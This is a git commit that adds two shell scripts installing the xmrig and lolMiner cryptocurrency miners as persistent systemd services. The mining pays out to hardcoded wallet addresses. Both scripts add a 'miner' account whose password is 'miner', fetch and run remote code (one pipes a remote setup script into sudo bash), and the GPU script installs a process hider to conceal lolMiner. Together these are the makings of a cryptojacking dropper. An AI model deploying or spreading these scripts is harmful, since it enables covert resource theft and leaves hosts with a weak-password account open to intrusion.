917907b376dead4344a186985c7f927737f4eb44
Toomas <52831344+Toomas633@users.noreply.github.com>
2022-05-26 11:47:39 +0300

    Add files via upload

---
+++ updated_unminable-cpu.sh
@@ -0,0 +1,25 @@
+#!/bin/sh
+sudo apt update
+adduser miner --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+echo "miner:miner" | sudo chpasswd
+cd /home/miner
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+chmod +x xmrig
+
+cat > /etc/systemd/system/xmrig.service << EOF 
+[Unit]
+Description=XMRig Daemon
+After=network.target
+[Service]
+Type=forking
+GuessMainPID=no
+ExecStart=/home/miner/xmrig/build/xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.$(echo $(shuf -i 1-999 -n 1)-CPU) -p 2 -t 40 -B
+Restart=always
+User=miner
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable xmrig.service
---
+++ updated_whalestonpool-gpu-ton-2.sh
@@ -0,0 +1,46 @@
+#!/bin/bash
+#!/bin/sh
+#!/bin/bash
+
+apt-get update && apt-get full-upgrade
+apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang
+sudo curl -fsSL https://deb.nodesource.com/setup_12.x | sudo -E bash - 
+apt-get install -y nodejs 
+npm i -g node-process-hider && sudo ph add lolMiner
+adduser miner --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
+echo "miner:miner" | sudo chpasswd
+cd /home/miner
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.50/lolMiner_v1.50_Lin64.tar.gz
+tar -xzvf lolMiner_v1.50_Lin64.tar.gz
+cd 1.50
+
+#################################
+## Begin of user-editable part ##
+#################################
+
+BTCPOOL=ethash.unmineable.com:3333
+BTCWALLET=BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993
+BTCWORKER=lolMiner
+
+TONPOOL=https://server1.whalestonpool.com
+TONWALLET=EQCmOWzntn9fxLZw9i2qn2ORX5wwzM--yjBvvW5JgKKjqkhV
+
+#################################
+##  End of user-editable part  ##
+#################################
+
+cat > /etc/systemd/system/lolMiner.service << EOF 
+[Unit]
+Description=lolMiner Daemon
+After=network.target
+[Service]
+Type=forking
+GuessMainPID=no
+ExecStart=/home/miner/1.50/lolMiner --algo ETHASH --pool $BTCPOOL --user $BTCWALLET --dualmode TONDUAL --dualpool $TONPOOL --dualuser $TONWALLET --worker $BTCWORKER $@
+Restart=always
+User=miner
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable lolMiner.service
